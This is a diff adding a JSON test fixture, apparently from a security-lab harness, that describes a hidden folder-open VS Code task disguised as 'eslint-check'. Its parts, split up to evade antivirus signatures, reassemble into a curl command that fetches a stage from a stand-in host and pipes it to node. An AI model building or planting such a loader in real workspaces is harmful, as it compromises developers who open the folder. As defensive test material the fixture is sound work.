@@ -1,0 +1,9 @@
+{
+	"why": "Endpoint protection quarantines a faithful tasks.json for this campaign, so no host file carries it (EDR fixture-safety, AV-signature rule). The harness assembles the loader from these parts in memory and runs it inside the tab exactly as the folder-open task would (runOn folderOpen, hidden presentation). A real tasks.json is only ever written inside a tab's VM-private storage.",
+	"label": "eslint-check",
+	"fetchTool": ["cu", "rl", " -s"],
+	"stageUrl": "http://stage.loader-standin.example.test/s/linux?v=2",
+	"interpreter": ["no", "de"],
+	"dictStage": ".vscode/spellright.dict",
+	"rehNode": "/opt/seclab-reh/node"
+}
